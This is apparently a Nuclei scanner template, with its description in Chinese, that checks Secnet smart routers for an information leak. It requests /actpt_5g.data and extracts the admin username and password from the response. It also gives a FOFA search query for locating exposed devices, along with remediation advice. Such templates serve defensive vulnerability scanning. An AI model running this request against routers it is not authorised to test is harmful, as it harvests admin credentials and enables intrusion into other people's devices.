id: secnet-info-leak

info:
  name: Secnet 智能路由系统信息泄露
  author: DhiyaneshDk
  severity: high
  description: |
    该模板用于核查 Secnet 智能路由系统信息泄露。该类问题通常源于配置文件、备份文件、管理页面、服务状态或敏感资源被错误暴露到 Web 访问路径。模板会向目标发送探测请求，并依据请求 `/actpt_5g.data`、匹配 `"http_username":`、匹配 `"http_passwd":`、状态码 200 等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可获取版本、路径、账号、密钥、令牌、配置或业务数据等敏感信息。
    - 泄露的信息可能被用于凭据攻击、漏洞匹配、权限提升或横向移动。
  remediation: |
    - 移除 Web 根目录下不应公开的配置、备份、日志和临时文件。
    - 为敏感页面和资源增加访问控制，并按最小暴露原则收敛公开路径。
    - 轮换已暴露的密钥、令牌和凭据，并审计异常下载或枚举行为。
  reference:
    - https://mp.weixin.qq.com/s/lNlI5ZtUJG50ipS0WfytUw
    - https://github.com/gobysec/GobyVuls/blob/master/secnet_Intelligent_Router_actpt_5g.data_Infoleakage.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="安网-智能路由系统" || header="HTTPD_ac 1.0"
  tags: info-leak,secnet,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/actpt_5g.data"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"http_username":'
          - '"http_passwd":'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"http_username":"([a-z]+)"'
          - '"http_passwd":"([a-z]+)"'
